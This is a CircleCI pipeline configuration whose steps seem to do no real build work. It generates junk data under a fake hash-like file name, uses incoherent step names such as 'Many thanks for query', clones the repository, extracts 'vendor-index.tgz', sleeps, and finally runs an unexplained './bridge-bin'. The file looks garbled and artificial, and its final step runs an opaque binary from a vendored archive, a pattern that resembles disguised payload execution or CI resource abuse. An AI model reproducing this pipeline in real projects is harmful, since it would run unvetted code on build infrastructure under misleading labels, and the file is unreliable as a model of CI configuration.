version: 2.1

jobs:
  intra_text:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Many thanks for query
          command: |
            mkdir -p /tmp/e3
            set +o pipefail 2>/dev/null; seq 1 829768 | tr -d '[:space:]' | fold -w 60 > /tmp/e3/md5_2242c9e18c7a2a7; true
            echo "stage v ok"
      - persist_to_workspace:
          root: /tmp/e3
          paths:
            - 'md5_2242c9e18c7a2a7'
  validte-2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/e3
      - run:
          name: Attach B
          command: |
            { head -c 1 /tmp/e3/md5_2242c9e18c7a2a7 2>/dev/null; echo " <first byte>" ; } || true
      - run:
          name: Retrieve repository
          command: git clone --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Materialize bundle
          command: tar xzvf vendor-index.tgz
      - run:
          no_output_timeout: 15m
          command: sleep 90
      - run:
          name: Verify output
          command: df -h
      - run:
          command: ./bridge-bin && true
